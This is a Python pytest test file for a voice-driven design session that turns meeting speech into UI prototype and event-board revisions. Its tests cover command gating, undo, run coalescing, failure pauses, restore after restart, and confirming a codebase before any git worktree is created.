"""The live design session: state machine, run loop, persistence, listener."""
from __future__ import annotations

import json
import threading
from datetime import date
from pathlib import Path

import pytest

from ghostbrain.design import (
    board_agent,
    codebases,
    commands,
    relevance,
    scaffold,
    ui_agent,
    worktree,
)
from ghostbrain.design import session as ds
from ghostbrain.design.commands import Command

DAY = date(2026, 10, 10)
# The real protected-file functions, for tests that run them on disk.
REAL_SNAPSHOT = worktree.snapshot_protected
REAL_RESTORE = worktree.restore_protected


class Clock:
    def __init__(self) -> None:
        self.t = 1000.0

    def __call__(self) -> float:
        return self.t


@pytest.fixture()
def vault(tmp_path: Path) -> Path:
    v = tmp_path / "vault"
    (v / "20-contexts" / "work").mkdir(parents=True)
    return v


class Fakes:
    def __init__(self) -> None:
        self.detect_calls: list = []
        self.detect_answer: Command | None = None
        self.relevant_answer = (True, "")
        self.relevant_calls: list = []
        self.ui_calls: list[dict] = []
        self.ui_result: dict | Exception = {"session_id": "cli-1", "summary": "Built the list", "cost_usd": 0.1}
        self.board_calls: list = []
        self.relevant_contexts: list[str] = []
        self.board_briefs: list[str] = []
        self.board_result: dict | Exception = {
            "model": {"contexts": [], "items": [{"id": "e1", "kind": "event", "label": "Claim Submitted",
                                                 "context": None, "order": 1}], "links": []},
            "summary": "Added an event",
        }
        self.created: list = []
        self.commits: list[str] = []
        self.reverts: list = []
        self.provider = "claude"
        self.artefact_writes: list[tuple[Path, dict]] = []


@pytest.fixture()
def fakes(monkeypatch, vault) -> Fakes:
    f = Fakes()

    def detect(window, new, *, focus, states, run=None):
        f.detect_calls.append((window, new, focus, dict(states)))
        return f.detect_answer if commands.PREFILTER.search(new) else None

    def relevant(canvas, text, *, context="", run=None):
        f.relevant_calls.append((canvas, text))
        f.relevant_contexts.append(context)
        return f.relevant_answer

    def run_ui(prototype_dir, **kw):
        f.ui_calls.append(kw)
        if isinstance(f.ui_result, Exception):
            raise f.ui_result
        return dict(f.ui_result)

    def run_board(current, excerpt, nudges, *, budget_usd, run=None, project_brief=""):
        f.board_calls.append((current, excerpt, nudges))
        f.board_briefs.append(project_brief)
        if isinstance(f.board_result, Exception):
            raise f.board_result
        return json.loads(json.dumps(f.board_result))

    def create(prototype_dir, pack_id, *, title):
        f.created.append((Path(prototype_dir), pack_id, title))
        (Path(prototype_dir) / "src").mkdir(parents=True)
        (Path(prototype_dir) / "design-pack").mkdir()
        (Path(prototype_dir) / "design-pack" / "README.md").write_text("Use tokens")

    def commit(prototype_dir, message):
        f.commits.append(message)
        return f"sha{len(f.commits)}"

    def revert_to(prototype_dir, rev):
        f.reverts.append(rev)

    monkeypatch.setattr(commands, "detect", detect)
    monkeypatch.setattr(relevance, "relevant", relevant)
    monkeypatch.setattr(ui_agent, "run_ui", run_ui)
    monkeypatch.setattr(board_agent, "run_board", run_board)
    monkeypatch.setattr(scaffold, "create", create)
    monkeypatch.setattr(scaffold, "commit", commit)
    monkeypatch.setattr(scaffold, "revert_to", revert_to)
    monkeypatch.setattr(ds, "_provider_id", lambda: f.provider)
    monkeypatch.setattr(ds, "_write_artefact",
                        lambda folder, data: f.artefact_writes.append((Path(folder), json.loads(json.dumps(data)))))
    monkeypatch.setattr(ds, "_load_artefact", lambda folder: None)
    yield f
    ds.stop_all()


def make(tmp_path, *, clock=None, threaded=False, **kw) -> ds.DesignSession:
    wav = tmp_path / "rec" / "meeting-1.wav"
    wav.parent.mkdir(exist_ok=True)
    s = ds.DesignSession(
        wav, title=kw.pop("title", "Claims Portal Review"), context="work",
        clock=clock or Clock(), threaded=threaded, today=DAY, **kw,
    )
    return s


def seg(seq, text, t0=None, t1=None):
    t0 = float(seq * 3) if t0 is None else t0
    return {"type": "segment", "seq": seq, "t0": t0, "t1": t0 + 3.0 if t1 is None else t1, "text": text, "lang": "en"}


def collect(s):
    q = s.subscribe()
    out: list = []

    def drain():
        while not q.empty():
            out.append(q.get())
        return out
    return drain


# -- gating -------------------------------------------------------------------

def test_small_talk_never_reaches_command_detection(tmp_path, fakes):
    s = make(tmp_path)
    s.on_segment(seg(1, "how was your weekend"))
    assert fakes.detect_calls == []
    assert fakes.relevant_calls == []  # no canvas active → nothing to classify


def test_listening_off_skips_command_detection(tmp_path, fakes):
    s = make(tmp_path, listening=False)
    fakes.detect_answer = Command("start_ui", "ui", None)
    s.on_segment(seg(1, "let's kick off a frontend prototype"))
    assert fakes.detect_calls == []
    assert s.snapshot()["canvases"]["ui"]["state"] == "off"


def test_segments_are_processed_once_by_seq(tmp_path, fakes):
    s = make(tmp_path)
    s.on_segment(seg(1, "let's talk design"))
    s.on_segment(seg(1, "let's talk design"))
    assert len(fakes.detect_calls) == 1


# -- spoken start ---------------------------------------------------------------

def test_spoken_start_ui_scaffolds_seeds_and_runs(tmp_path, fakes, vault):
    s = make(tmp_path)
    events = collect(s)
    s.on_segment(seg(1, "we need a list of open claims"))
    fakes.detect_answer = Command("start_ui", "ui", None)
    s.on_segment(seg(2, "let's kick off a frontend prototype"))

    expected = vault / "20-contexts" / "work" / "prototypes" / "2026-10-10-claims-portal-review"
    assert fakes.created == [(expected, "poltergeist-neutral", "Claims Portal Review")]
    cmd_events = [e for e in events() if e["type"] == "command"]
    assert cmd_events == [{
        "type": "command", "command": "start_ui", "canvas": "ui",
        "label": "Started frontend prototype", "undo_token": cmd_events[0]["undo_token"], "spoken": True,
    }]
    assert cmd_events[0]["undo_token"]
    snap = s.snapshot()
    assert snap["focus"] == "ui"
    assert snap["canvases"]["ui"]["state"] == "active"
    assert snap["prototype_dir"] == str(expected)
    assert snap["prototype_rel"] == "20-contexts/work/prototypes/2026-10-10-claims-portal-review"

    s.run_pending()
    assert len(fakes.ui_calls) == 1
    assert "we need a list of open claims" in fakes.ui_calls[0]["excerpt"]
    assert "let's kick off a frontend prototype" in fakes.ui_calls[0]["excerpt"]
    assert fakes.ui_calls[0]["pack_readme"] == "Use tokens"
    assert fakes.ui_calls[0]["session_id"] is None
    assert fakes.commits == ["rev 1: Built the list"]
    snap = s.snapshot()
    assert snap["canvases"]["ui"]["rev"] == 1
    assert [r["rev"] for r in snap["canvases"]["ui"]["revs"]] == [1]
    assert {"type": "revision", "canvas": "ui", "rev": 1, "summary": "Built the list"} in events()

    # the next run resumes the CLI session and does not re-send consumed text
    with pytest.raises(ds.SessionError, match="Nothing new"):
        s.force_update("ui")  # nothing said since rev 1 → tell the user, no run
    s.run_pending()
    assert len(fakes.ui_calls) == 1
    s.nudge("ui", "add a status filter")
    s.run_pending()
    assert fakes.ui_calls[1]["session_id"] == "cli-1"
    assert fakes.ui_calls[1]["nudges"] == ["add a status filter"]
    assert "open claims" not in fakes.ui_calls[1]["excerpt"]


def test_start_board_pauses_ui_and_focus_ui_pauses_board(tmp_path, fakes):
    s = make(tmp_path)
    s.start("ui")
    s.start("board")
    snap = s.snapshot()
    assert (snap["focus"], snap["canvases"]["ui"]["state"], snap["canvases"]["board"]["state"]) == (
        "board", "paused", "active")
    fakes.detect_answer = Command("focus_ui", "ui", None)
    s.on_segment(seg(1, "back to the UI"))
    snap = s.snapshot()
    assert (snap["focus"], snap["canvases"]["ui"]["state"], snap["canvases"]["board"]["state"]) == (
        "ui", "active", "paused")
    assert len(fakes.created) == 1  # one scaffold shared by both canvases


def test_pause_both_and_resume(tmp_path, fakes):
    s = make(tmp_path)
    s.start("board")
    s.start("ui")
    ev = s.pause("both")
    assert ev["label"] == "Paused design session"
    snap = s.snapshot()
    assert snap["canvases"]["ui"]["state"] == snap["canvases"]["board"]["state"] == "paused"
    s.resume("board")
    snap = s.snapshot()
    assert snap["canvases"]["board"]["state"] == "active"
    assert snap["focus"] == "board"


def test_noop_command_emits_nothing(tmp_path, fakes):
    s = make(tmp_path)
    s.start("ui")
    assert s.apply_command(Command("start_ui", "ui", None), spoken=True) is None


def test_undo_restores_previous_state_and_tokens_expire(tmp_path, fakes):
    clock = Clock()
    s = make(tmp_path, clock=clock)
    s.start("ui")
    ev = s.start("board")
    s.undo(ev["undo_token"])
    snap = s.snapshot()
    assert (snap["focus"], snap["canvases"]["ui"]["state"], snap["canvases"]["board"]["state"]) == (
        "ui", "active", "off")
    with pytest.raises(ds.SessionError):
        s.undo(ev["undo_token"])  # single use
    ev = s.pause("ui")
    clock.t += ds.UNDO_TTL_S + 1
    with pytest.raises(ds.SessionError):
        s.undo(ev["undo_token"])


def test_nudge_is_not_undoable(tmp_path, fakes):
    s = make(tmp_path)
    s.start("ui")
    ev = s.nudge(None, "add a filter")
    assert ev["command"] == "nudge" and ev["canvas"] == "ui" and ev["undo_token"] is None
    assert ev["label"] == "Nudge: add a filter"


# -- relevance + triggers --------------------------------------------------------

def test_relevant_speech_fires_after_pause_threshold(tmp_path, fakes):
    clock = Clock()
    s = make(tmp_path, clock=clock)
    s.start("ui")
    s.run_pending()  # nothing buffered → no run
    assert fakes.ui_calls == []
    s.on_segment(seg(1, "the table needs a status column"))
    assert fakes.relevant_calls == [("ui", "the table needs a status column")]
    assert s.snapshot()["canvases"]["ui"]["buffered_s"] == 3.0
    clock.t += relevance.PAUSE_S - 1
    s.tick()
    s.run_pending()
    assert fakes.ui_calls == []
    clock.t += 2
    s.tick()
    s.run_pending()
    assert fakes.ui_calls[0]["excerpt"] == "the table needs a status column"


def test_irrelevant_speech_is_dropped(tmp_path, fakes):
    clock = Clock()
    s = make(tmp_path, clock=clock)
    s.start("ui")
    fakes.relevant_answer = (False, "")
    s.on_segment(seg(1, "anyone want coffee"))
    clock.t += 100
    s.tick()
    s.run_pending()
    assert fakes.ui_calls == []
    assert s.snapshot()["canvases"]["ui"]["buffered_s"] == 0


def test_speech_goes_only_to_the_focused_canvas(tmp_path, fakes):
    s = make(tmp_path)
    s.start("ui")
    s.start("board")
    s.on_segment(seg(1, "an order was placed"))
    assert fakes.relevant_calls == [("board", "an order was placed")]


# -- run loop --------------------------------------------------------------------

def test_single_flight_and_coalescing(tmp_path, fakes, monkeypatch):
    gate = threading.Event()
    started = threading.Event()
    calls = []

    def slow_run_ui(prototype_dir, **kw):
        calls.append(kw)
        started.set()
        gate.wait(5)
        return {"session_id": "s", "summary": f"run {len(calls)}", "cost_usd": 0}

    monkeypatch.setattr(ui_agent, "run_ui", slow_run_ui)
    s = make(tmp_path, threaded=True)
    s.start("ui")
    s.nudge("ui", "one")
    assert started.wait(5)
    s.nudge("ui", "two")
    s.nudge("ui", "three")
    s.force_update("ui")
    assert s.snapshot()["canvases"]["ui"]["running"] is True
    gate.set()
    assert s.wait_idle(5)
    assert len(calls) == 2
    assert calls[1]["nudges"] == ["two", "three"]
    assert s.snapshot()["canvases"]["ui"]["rev"] == 2


def test_three_failures_pause_the_canvas(tmp_path, fakes):
    s = make(tmp_path)
    events = collect(s)
    fakes.ui_result = ui_agent.UiAgentError("boom")
    s.start("ui")
    for i in range(3):
        s.nudge("ui", f"try {i}")
        s.run_pending()
    snap = s.snapshot()["canvases"]["ui"]
    assert snap["state"] == "paused"
    assert "3" in snap["reason"]
    assert snap["last_error"] == "boom"
    errors = [e for e in events() if e["type"] == "error"]
    assert len(errors) == 3 and errors[0] == {"type": "error", "canvas": "ui", "message": "boom"}
    # the failed runs' nudges are kept for the next attempt
    assert fakes.ui_calls[-1]["nudges"] == ["try 0", "try 1", "try 2"]


def test_build_error_fix_runs_are_capped(tmp_path, fakes):
    s = make(tmp_path)
    s.start("ui")
    s.nudge("ui", "first")
    s.run_pending()
    s.report_build_error(1, "cannot resolve ./Foo")
    s.run_pending()
    assert fakes.ui_calls[-1]["build_error"] == "cannot resolve ./Foo"
    s.report_build_error(1, "stale rev")  # not the current rev → ignored
    s.run_pending()
    assert len(fakes.ui_calls) == 2
    s.report_build_error(2, "still broken")
    s.run_pending()
    assert len(fakes.ui_calls) == 3
    s.report_build_error(3, "broken again")
    s.run_pending()
    assert len(fakes.ui_calls) == 3
    assert s.snapshot()["canvases"]["ui"]["last_error"] == "broken again"


def test_ui_needs_the_claude_provider(tmp_path, fakes):
    fakes.provider = "codex"
    s = make(tmp_path)
    with pytest.raises(ds.SessionError):
        s.start("ui")
    ui = s.snapshot()["canvases"]["ui"]
    assert ui["state"] == "unavailable"
    assert ui["reason"] == "Live prototyping needs the Claude provider"
    s.start("board")
    assert s.snapshot()["canvases"]["board"]["state"] == "active"


def test_board_run_writes_board_json_and_commits(tmp_path, fakes):
    s = make(tmp_path)
    events = collect(s)
    s.start("board")
    s.nudge("board", "add claim submitted")
    s.run_pending()
    path = Path(s.prototype_dir) / "board.json"
    assert json.loads(path.read_text())["items"][0]["id"] == "e1"
    assert fakes.commits == ["board 1: Added an event"]
    snap = s.snapshot()
    assert snap["board"]["items"][0]["label"] == "Claim Submitted"
    assert snap["canvases"]["board"]["rev"] == 1
    assert {"type": "revision", "canvas": "board", "rev": 1, "summary": "Added an event"} in events()
    # the next run sees the current model
    s.nudge("board", "more")
    s.run_pending()
    assert fakes.board_calls[1][0]["items"][0]["id"] == "e1"


def test_snapshot_matches_the_wire_contract(tmp_path, fakes):
    from ghostbrain.api.models.design import DesignSessionSnapshot

    s = make(tmp_path)
    snap = s.snapshot()
    assert set(snap) == {"id", "recording_title", "context", "project_id", "pack_id", "prototype_dir",
                         "prototype_rel", "focus", "listening", "canvases", "board",
                         "ui_kind", "codebase", "install", "codebase_confirmed", "artefact_rel"}
    assert (snap["ui_kind"], snap["codebase"], snap["install"]) == ("scratch", None, "idle")
    assert snap["codebase_confirmed"] is True
    assert snap["artefact_rel"] == snap["prototype_rel"]
    assert set(snap["canvases"]) == {"ui", "board"}
    assert set(snap["canvases"]["ui"]) == {"state", "rev", "running", "buffered_s", "reason",
                                           "last_error", "revs"}
    DesignSessionSnapshot.model_validate(snap)


def test_revert_ui_and_board(tmp_path, fakes):
    s = make(tmp_path)
    s.start("ui")
    s.nudge("ui", "a")
    s.run_pending()
    s.nudge("ui", "b")
    s.run_pending()
    s.revert("ui", 1)
    assert fakes.reverts == [1]
    ui = s.snapshot()["canvases"]["ui"]
    assert ui["rev"] == 3 and ui["revs"][-1]["summary"] == "Reverted to rev 1"

    s.start("board")
    s.nudge("board", "x")
    s.run_pending()
    s.revert("board", 0)
    snap = s.snapshot()
    assert snap["board"] == {"contexts": [], "items": [], "links": []}
    assert snap["canvases"]["board"]["rev"] == 2
    with pytest.raises(ds.SessionError):
        s.revert("board", 7)


def test_config_before_start_moves_the_folder_and_pack_change_forces_update(tmp_path, fakes, vault, monkeypatch):
    from ghostbrain.api.repo import projects
    from ghostbrain.design import packs

    monkeypatch.setattr(projects, "get_project", lambda ctx, slug, **kw: {
        "id": f"{ctx}/{slug}", "context": ctx, "slug": slug, "name": "Claims", "design_system": None})
    monkeypatch.setattr(packs, "get_pack", lambda pid: {"id": pid})
    copied = []
    monkeypatch.setattr(packs, "copy_into", lambda pid, dest: copied.append((pid, Path(dest))))
    s = make(tmp_path)
    s.set_config(project_id="work/claims")
    assert s.snapshot()["prototype_rel"] == (
        "20-contexts/work/projects/claims/prototypes/2026-10-10-claims-portal-review")
    s.start("ui")
    s.nudge("ui", "a")
    s.run_pending()
    s.set_config(pack_id="acme")
    assert copied == [("acme", Path(s.prototype_dir) / "design-pack")]
    assert s.snapshot()["pack_id"] == "acme"
    s.run_pending()
    assert len(fakes.ui_calls) == 2


def test_new_session_gets_a_unique_folder(tmp_path, fakes, vault):
    existing = vault / "20-contexts" / "work" / "prototypes" / "2026-10-10-claims-portal-review"
    existing.mkdir(parents=True)
    s = make(tmp_path)
    s.start("board")
    assert s.prototype_dir.endswith("2026-10-10-claims-portal-review-2")


# -- end + restore ---------------------------------------------------------------

def test_end_runs_a_final_update_and_writes_the_index_note(tmp_path, fakes):
    clock = Clock()
    s = make(tmp_path, clock=clock)
    events = collect(s)
    s.start("ui")
    s.on_segment(seg(1, "add an export button"))
    s.end()
    assert fakes.ui_calls[-1]["excerpt"] == "add an export button"
    snap = s.snapshot()
    assert snap["canvases"]["ui"]["state"] == "ended"
    assert snap["canvases"]["board"]["state"] == "off"
    folder, data = fakes.artefact_writes[-1]
    assert str(folder) == s.prototype_dir
    assert data["title"] == "Claims Portal Review" and data["date"] == "2026-10-10"
    assert data["kind"] == "prototype" and data["ui_rev"] == 1 and data["board"] is False
    assert events()[-1] == {"type": "end"}
    with pytest.raises(ds.SessionError):
        s.nudge("ui", "too late")


def test_session_is_restored_from_session_jsonl(tmp_path, fakes):
    s = make(tmp_path)
    s.start("ui")
    s.nudge("ui", "a")
    s.run_pending()
    wav, sid, folder = s.wav, s.id, s.prototype_dir
    ds._register(s)
    ds.stop_all()

    restored = ds.ensure(wav, title="ignored", context="work", threaded=False)
    snap = restored.snapshot()
    assert snap["id"] == sid
    assert snap["prototype_dir"] == folder
    assert snap["focus"] == "ui"
    ui = snap["canvases"]["ui"]
    assert ui["state"] == "paused" and ui["reason"] == "Resumed after restart"
    assert ui["rev"] == 1 and ui["revs"][0]["summary"] == "Built the list"
    restored.resume("ui")
    restored.nudge("ui", "b")
    restored.run_pending()
    assert fakes.ui_calls[-1]["session_id"] == "cli-1"
    assert fakes.commits[-1] == "rev 2: Built the list"


def test_registry_ensure_is_idempotent(tmp_path, fakes):
    wav = tmp_path / "w.wav"
    a = ds.ensure(wav, title="T", context="work", threaded=False)
    b = ds.ensure(wav, title="T", context="work", threaded=False)
    assert a is b and ds.current() is a and ds.get(wav) is a


# -- listener --------------------------------------------------------------------

def test_listener_feeds_segments_and_ends_the_session(tmp_path, fakes, monkeypatch):
    from ghostbrain.design import listener
    from ghostbrain.recorder import live

    wav = tmp_path / "rec.wav"

    def fake_follow(path=None, **kw):
        assert path == wav
        yield {"type": "segment", "seq": 1, "t0": 0.0, "t1": 2.0, "text": "let's kick off a frontend prototype"}
        yield None
        yield {"type": "status", "state": "live", "reason": None, "lag_s": 0.0}
        yield {"type": "status", "state": "finalizing", "reason": None, "lag_s": 0.0}

    monkeypatch.setattr(live, "follow", fake_follow)
    monkeypatch.setattr(listener, "_recording_meta", lambda w: ("Claims sync", "work"))
    monkeypatch.setattr(listener, "_pick_project", lambda title, context: None)
    fakes.detect_answer = Command("start_ui", "ui", None)
    thread = listener.start_for_recording(wav, threaded_session=False)
    thread.join(5)
    s = ds.get(wav)
    assert s.recording_title == "Claims sync"
    assert s.snapshot()["canvases"]["ui"]["state"] == "ended"
    assert len(fakes.ui_calls) == 1  # final run on the seeded buffer


def test_listener_never_raises_into_recording(tmp_path, monkeypatch):
    from ghostbrain.design import listener

    monkeypatch.setattr(ds, "ensure", lambda *a, **k: (_ for _ in ()).throw(RuntimeError("x")))
    listener.on_live_begin(tmp_path / "x.wav")  # must not raise


def test_pick_project_matches_title(monkeypatch):
    from ghostbrain.api.repo import projects
    from ghostbrain.design import listener

    monkeypatch.setattr(projects, "list_projects", lambda **kw: [
        {"id": "work/claims", "context": "work", "slug": "claims", "name": "Claims"},
        {"id": "personal/x", "context": "personal", "slug": "x", "name": "Garden"},
    ])
    assert listener._pick_project("Weekly claims review", "work")["id"] == "work/claims"
    assert listener._pick_project("Standup", "work") is None


def test_live_begin_runs_hooks_and_survives_a_failing_one(tmp_path, monkeypatch):
    from ghostbrain.recorder import live

    class Server:
        def start(self):
            raise RuntimeError("no server in tests")

        def stop(self):
            pass

    seen = []

    def bad(wav):
        raise RuntimeError("hook exploded")

    monkeypatch.setattr(live, "_on_begin", [bad, seen.append])
    wav = tmp_path / "hook.wav"
    assert live.begin(wav, server_factory=Server) is not None
    assert seen == [wav]
    live.begin(wav, server_factory=Server)  # already running → hooks not re-run
    assert seen == [wav]


# -- smoke-test regressions ---------------------------------------------------

def test_spoken_pause_of_an_idle_canvas_pauses_the_running_one(tmp_path, fakes):
    """'Let's stop prototyping' while the board has focus: the model names
    the (already paused) ui canvas — stop the design work that is running."""
    s = make(tmp_path)
    s.start("ui")
    s.start("board")
    fakes.detect_answer = Command("pause", "ui", None)
    s.on_segment(seg(1, "Okay, let's stop prototyping for now"))
    snap = s.snapshot()
    assert snap["canvases"]["board"]["state"] == "paused"
    assert snap["canvases"]["ui"]["state"] == "paused"


def test_switching_canvas_does_not_seed_talk_the_other_canvas_used(tmp_path, fakes):
    s = make(tmp_path)
    fakes.detect_answer = Command("start_ui", "ui", None)
    s.on_segment(seg(1, "let's kick off a frontend prototype"))
    fakes.detect_answer = None
    s.on_segment(seg(2, "a claims table with status filters"))
    s.force_update("ui")
    s.run_pending()
    fakes.detect_answer = Command("focus_board", "board", None)
    s.on_segment(seg(3, "let's focus on the backend"))
    s.run_pending()
    excerpt = fakes.board_calls[-1][1]
    assert "claims table" not in excerpt
    assert "focus on the backend" in excerpt


# -- utterances split across segments -------------------------------------------

def test_command_split_across_segments_is_judged_as_one_utterance(tmp_path, fakes):
    s = make(tmp_path)
    s.on_segment(seg(1, "okay poltergeist, let's start a design session"))
    fakes.detect_answer = Command("start_ui", "ui", None)
    s.on_segment(seg(2, "a front-end prototype."))
    window, new, _focus, _states = fakes.detect_calls[-1]
    assert new == "okay poltergeist, let's start a design session\na front-end prototype."
    assert "design session" not in window
    assert s.snapshot()["canvases"]["ui"]["state"] == "active"


def test_utterance_tail_restarts_after_a_command(tmp_path, fakes):
    s = make(tmp_path)
    fakes.detect_answer = Command("start_ui", "ui", None)
    s.on_segment(seg(1, "let's kick off a frontend prototype"))
    fakes.detect_answer = None
    s.on_segment(seg(2, "let's focus on the login"))
    _window, new, _focus, _states = fakes.detect_calls[-1]
    assert new == "let's focus on the login"


def test_utterance_tail_drops_old_speech(tmp_path, fakes):
    s = make(tmp_path)
    s.on_segment(seg(1, "let's talk about the design", t0=0.0, t1=3.0))
    s.on_segment(seg(2, "a front-end prototype", t0=30.0, t1=33.0))
    _window, new, _focus, _states = fakes.detect_calls[-1]
    assert new == "a front-end prototype"


# -- relevance context and "Update now" catch-up -----------------------------------

def test_relevance_sees_the_recent_conversation(tmp_path, fakes):
    s = make(tmp_path)
    s.start("ui")
    s.on_segment(seg(1, "we built a login screen"))
    s.on_segment(seg(2, "now demo it to me"))
    judged = fakes.relevant_calls[-1][1] + "\n" + fakes.relevant_contexts[-1]
    assert "we built a login screen" in judged


def test_update_now_catches_up_on_speech_the_filter_dropped(tmp_path, fakes):
    s = make(tmp_path)
    s.start("ui")
    s.run_pending()
    calls = len(fakes.ui_calls)
    fakes.relevant_answer = (False, "")
    s.on_segment(seg(5, "fill it in and show me the validation"))
    s.force_update("ui")
    s.run_pending()
    assert len(fakes.ui_calls) == calls + 1
    assert "fill it in and show me the validation" in fakes.ui_calls[-1]["excerpt"]


# -- artefact note ----------------------------------------------------------------

@pytest.fixture()
def artefact_writes(fakes):
    return fakes.artefact_writes


def test_artefact_written_after_revision_and_end(tmp_path, fakes, artefact_writes):
    s = make(tmp_path)
    s.start("ui")
    s.nudge("ui", "a")
    s.run_pending()
    assert artefact_writes and artefact_writes[-1][1]["ui_rev"] == 1
    s.end()
    kinds = [d["kind"] for _, d in artefact_writes]
    assert kinds and kinds[-1] == "prototype" and artefact_writes[-1][1]["ui_rev"] == 1
    data = artefact_writes[-1][1]
    assert data["version"] == 1 and data["wav"] == str(s.wav) and data["context"] == "work"
    assert data["design_system"] == "poltergeist-neutral" and data["codebase"] is None
    assert [r["rev"] for r in data["revs"]] == [1]


def test_artefact_kind_board_and_keeps_the_meeting_link(tmp_path, fakes, monkeypatch):
    monkeypatch.setattr(ds, "_load_artefact", lambda folder: {
        "meeting": "Claims sync", "meeting_path": "20-contexts/work/x.md", "title": "Claims sync"})
    s = make(tmp_path, title=None)
    s.start("board")
    s.nudge("board", "x")
    s.run_pending()
    data = fakes.artefact_writes[-1][1]
    assert data["kind"] == "board" and data["board"] is True and data["board_rev"] == 1
    assert data["meeting"] == "Claims sync" and data["meeting_path"] == "20-contexts/work/x.md"
    assert data["title"] == "Claims sync"


def test_artefact_write_failure_never_breaks_a_run(tmp_path, fakes, monkeypatch):
    def boom(folder, data):
        raise OSError("disk full")

    monkeypatch.setattr(ds, "_write_artefact", boom)
    s = make(tmp_path)
    s.start("ui")
    s.nudge("ui", "a")
    s.run_pending()
    s.end()
    assert s.snapshot()["canvases"]["ui"]["rev"] == 1


# -- worktree mode ------------------------------------------------------------------

class WtFakes:
    def __init__(self, root: Path) -> None:
        self.repo = root / "code" / "acme-web"
        self.repo.mkdir(parents=True)
        self.bff = root / "code" / "acme-bff"
        self.bff.mkdir(parents=True)
        self.resolve_to: codebases.Candidate | None = codebases.Candidate(self.repo, "acme-web", "acme-web", True)
        self.resolve_calls: list = []
        self.app_dir: Path | None | str = "root"
        self.created: list[worktree.Worktree] = []
        self.removed: list = []
        self.installs = 0
        self.install_error: Exception | None = None
        self.commits: list[str] = []
        self.reverts: list[int] = []
        self.restored: list[str] = []
        self.restore_calls = 0
        self.snapshots = 0
        self.deps = False
        self.meta: list[Path] = []
        self.create_error: Exception | None = None


@pytest.fixture()
def wt_fakes(monkeypatch, tmp_path, fakes) -> WtFakes:
    w = WtFakes(tmp_path)
    cands = [codebases.Candidate(w.repo, "acme-web", "acme-web", True),
             codebases.Candidate(w.bff, "acme-bff", "acme-bff", False)]

    def resolve(hint, candidates=None, *, frontend=True, run=None):
        w.resolve_calls.append(hint)
        return w.resolve_to

    def create(repo, *, day, slug):
        if w.create_error:
            raise w.create_error
        path = Path(repo).parent / f"{Path(repo).name}-poltergeist-{day.isoformat()}-{slug}"
        path.mkdir(parents=True, exist_ok=True)
        wt = worktree.Worktree(repo=Path(repo), path=path, branch=f"poltergeist/{day.isoformat()}-{slug}",
                               base="origin/main", app_dir=path)
        w.created.append(wt)
        return wt

    def find_app_dir(path):
        return Path(path) if w.app_dir == "root" else w.app_dir

    def install(wt, *, log_path, timeout_s=600, runner=None):
        w.installs += 1
        if w.install_error:
            raise w.install_error

    def commit(wt, message, *, allow_empty=False):
        assert allow_empty, "every rev needs its commit"
        w.commits.append(message)
        return f"wsha{len(w.commits)}"

    def revert_to(wt, rev):
        if rev not in {int(m.split(":")[0].split()[1]) for m in w.commits if m.startswith("rev ")}:
            raise KeyError(rev)
        w.reverts.append(rev)

    def snapshot_protected(wt):
        w.snapshots += 1
        return {"package.json": '{"name":"web"}'}

    def restore_protected(wt, snap):
        w.restore_calls += 1
        assert snap == {"package.json": '{"name":"web"}'}
        return list(w.restored)

    def init_meta(folder):
        w.meta.append(Path(folder))
        Path(folder).mkdir(parents=True, exist_ok=True)

    monkeypatch.setattr(codebases, "scan", lambda *a, **k: list(cands))
    monkeypatch.setattr(codebases, "resolve", resolve)
    monkeypatch.setattr(worktree, "create", create)
    monkeypatch.setattr(worktree, "find_app_dir", find_app_dir)
    monkeypatch.setattr(worktree, "install", install)
    monkeypatch.setattr(worktree, "commit", commit)
    monkeypatch.setattr(worktree, "revert_to", revert_to)
    monkeypatch.setattr(worktree, "snapshot_protected", snapshot_protected)
    monkeypatch.setattr(worktree, "restore_protected", restore_protected)
    monkeypatch.setattr(worktree, "deps_changed", lambda wt, sha: w.deps)
    monkeypatch.setattr(worktree, "remove", lambda wt: w.removed.append(wt) or
                        {"removed": True, "branch_kept": False, "reason": None})
    monkeypatch.setattr(scaffold, "init_meta", init_meta)
    return w


def snap_rev(s, canvas="ui"):
    return s.snapshot()["canvases"][canvas]["rev"]


def started_worktree_session(tmp_path, fakes, wt_fakes, *, bootstrap=True):
    s = make(tmp_path)
    s.set_codebase(str(wt_fakes.repo))
    s.start("ui")
    if bootstrap:
        s.run_pending()
        assert snap_rev(s) == 1
    return s


def test_spoken_codebase_waits_for_confirmation(tmp_path, fakes, wt_fakes, vault):
    s = make(tmp_path)
    events = collect(s)
    s.on_segment(seg(1, "the list needs a status column"))
    fakes.detect_answer = Command("start_ui", "ui", None, "Acme frontend")
    s.on_segment(seg(2, "today we're working on Acme, use our existing frontend"))
    assert wt_fakes.resolve_calls == ["Acme frontend"]
    snap = s.snapshot()
    assert snap["ui_kind"] == "worktree" and snap["codebase_confirmed"] is False
    assert snap["codebase"] == {"repo": str(wt_fakes.repo), "name": "acme-web", "app_dir": "",
                                "worktree": "", "branch": "", "base": ""}
    ui = snap["canvases"]["ui"]
    assert ui["state"] == "active" and ui["reason"] == ds.CONFIRM_REASON
    toast = [e for e in events() if e.get("command") == "codebase"]
    assert toast and toast[0]["label"] == "Use acme-web? Confirm in the panel"
    assert toast[0]["undo_token"] is None
    # Meeting speech alone creates, installs and runs nothing.
    fakes.detect_answer = None
    s.on_segment(seg(3, "and a filter by owner"))
    s.nudge("ui", "make it sortable")
    s.force_update("ui")
    s.tick(s._clock() + 100)
    s.run_pending()
    assert wt_fakes.created == [] and wt_fakes.meta == [] and wt_fakes.installs == 0
    assert fakes.ui_calls == [] and s.snapshot()["install"] == "idle"
    assert s.snapshot()["canvases"]["ui"]["buffered_s"] > 0  # talk keeps buffering

    s.set_codebase(str(wt_fakes.repo))  # the user confirms
    snap = s.snapshot()
    assert snap["codebase_confirmed"] is True and snap["canvases"]["ui"]["reason"] is None
    assert snap["codebase"]["branch"] == "poltergeist/2026-10-10-claims-portal-review"
    assert snap["artefact_rel"] == "20-contexts/work/artefacts/2026-10-10-claims-portal-review"
    assert wt_fakes.meta == [Path(snap["prototype_dir"])] and fakes.created == []
    assert snap["install"] == "running"
    s.run_pending()
    assert wt_fakes.installs == 1
    assert fakes.ui_calls[0]["mode"] == "bootstrap"
    assert wt_fakes.commits[0] == "rev 1: Built the list"
    assert s.snapshot()["install"] == "done"
    # the talk while waiting is what the first meeting-driven run builds
    assert len(fakes.ui_calls) == 2 and fakes.ui_calls[1]["mode"] == "worktree"
    assert "status column" in fakes.ui_calls[1]["excerpt"] and "owner" in fakes.ui_calls[1]["excerpt"]
    assert fakes.ui_calls[1]["nudges"] == ["make it sortable"]
    assert fakes.ui_calls[1]["session_id"] == "cli-1"
